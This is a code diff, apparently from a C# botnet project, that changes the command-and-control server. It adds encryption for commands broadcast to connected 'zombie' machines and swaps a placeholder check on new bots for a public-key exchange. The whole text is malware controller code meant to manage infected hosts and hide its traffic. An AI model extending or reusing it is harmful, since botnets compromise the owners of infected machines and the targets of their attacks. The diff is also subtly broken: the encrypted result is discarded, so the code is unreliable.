@@ -51,6 +51,8 @@ namespace BotnetAPP.Network
         private Thread _checkingChangeBotAction;
         private Thread _timerThread;
 
+        private Encryption _encryption ; 
+
         private ASCIIEncoding _asen = new ASCIIEncoding();
 
 
@@ -72,6 +74,9 @@ namespace BotnetAPP.Network
 
             // Initialisation de la liste contenant les utilisateurs connectés 
             TimerAttack = new();
+
+
+            _encryption = new Encryption() ; 
 
             _bot = new ConnectedBotList();
 
@@ -162,6 +167,10 @@ namespace BotnetAPP.Network
 
             foreach (KeyValuePair<Zombie, Socket> item in bot)
             {
+
+                if ( message != "" ) {
+                    _encryption.Encrypt(message) ; 
+                }
                 WriteNetMessage(message, item.Value);
             }
         }
@@ -297,25 +306,17 @@ namespace BotnetAPP.Network
 
 
 
-                    /* 
-                    Pour l'instant je laisse comme ça
-                    Plus tard je mettrais un vrai système de contrôle de connexion
-                    */
+                    // On récupère la clé publique 
+                    _encryption.SetPublicKey(GetIncomingMessage(s)) ;
 
 
-
-
-                    if (GetIncomingMessage(s) == "1")
-                    {
 
                         Zombie nvZb = new(s.RemoteEndPoint.ToString());
                         _bot.Add(nvZb, s);
                         OnNewConnectedBot(nvZb);
 
-
-
-
-                    }
+                        
+                    
 
 
 
